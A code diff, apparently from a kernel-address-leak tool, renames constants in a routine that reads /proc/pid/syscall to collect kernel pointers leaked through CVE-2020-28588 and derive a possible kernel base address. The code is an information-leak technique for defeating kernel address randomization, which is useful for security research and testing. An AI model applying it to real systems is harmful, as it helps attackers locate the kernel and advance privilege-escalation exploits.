@@ -140,11 +140,11 @@ static unsigned long get_kernel_addr_proc_pid_syscall(void) {
         unsigned long a = reg_addr >> 32;
         unsigned long b = reg_addr & 0xffffffff;
 
-        /* Use PAGE_OFFSET as lower bound rather than KERNEL_TEXT_MIN.
-         * On 32-bit with 3G/1G split, KERNEL_TEXT_MIN (0x40000000) overlaps
-         * user-space, causing user register values (SP, LR, mmap addresses)
-         * to be misidentified as kernel pointers. Kernel stack addresses
-         * leaked by CVE-2020-28588 are always >= PAGE_OFFSET. */
+        /* Use PAGE_OFFSET as lower bound rather than KERNEL_VIRT_TEXT_MIN.
+         * On 32-bit with 3G/1G split, KERNEL_VIRT_TEXT_MIN (0x40000000)
+         * overlaps user-space, causing user register values (SP, LR, mmap
+         * addresses) to be misidentified as kernel pointers. Kernel stack
+         * addresses leaked by CVE-2020-28588 are always >= PAGE_OFFSET. */
         if (a < PAGE_OFFSET && b < PAGE_OFFSET)
           continue;
 
@@ -166,17 +166,17 @@ static unsigned long get_kernel_addr_proc_pid_syscall(void) {
       if (!leaked_addr)
         continue;
 
-      /* Lower-bound floor: max(PAGE_OFFSET, KERNEL_TEXT_MIN). The original
+      /* Lower-bound floor: max(PAGE_OFFSET, KERNEL_VIRT_TEXT_MIN). The original
        * code used PAGE_OFFSET alone (correct on 32-bit-with-VMSPLIT where
-       * PAGE_OFFSET > KERNEL_TEXT_MIN) but admitted near-zero values on any
-       * arch where PAGE_OFFSET == 0 — s390 in particular. The arch gate
+       * PAGE_OFFSET > KERNEL_VIRT_TEXT_MIN) but admitted near-zero values on
+       * any arch where PAGE_OFFSET == 0 — s390 in particular. The arch gate
        * above already prevents this component from compiling on 64-bit
        * arches; the max() here is defence-in-depth so the validator stays
        * sound even if the gate ever moves. */
-      unsigned long lo = PAGE_OFFSET > (unsigned long)KERNEL_TEXT_MIN
+      unsigned long lo = PAGE_OFFSET > (unsigned long)KERNEL_VIRT_TEXT_MIN
                              ? PAGE_OFFSET
-                             : (unsigned long)KERNEL_TEXT_MIN;
-      if (leaked_addr >= lo && leaked_addr <= KERNEL_TEXT_MAX) {
+                             : (unsigned long)KERNEL_VIRT_TEXT_MIN;
+      if (leaked_addr >= lo && leaked_addr <= KERNEL_VIRT_TEXT_MAX) {
         // printf("Found kernel pointer: %lx\n", leaked_addr);
         if (!addr || leaked_addr < addr)
           addr = leaked_addr;
@@ -195,7 +195,7 @@ int main(void) {
   }
 
   printf("lowest leaked address: %lx\n", addr);
-  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
+  printf("possible kernel base: %lx\n", addr & -KASLR_VIRT_ALIGN);
   kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, addr, NULL,
                       CONF_PARSED);
 
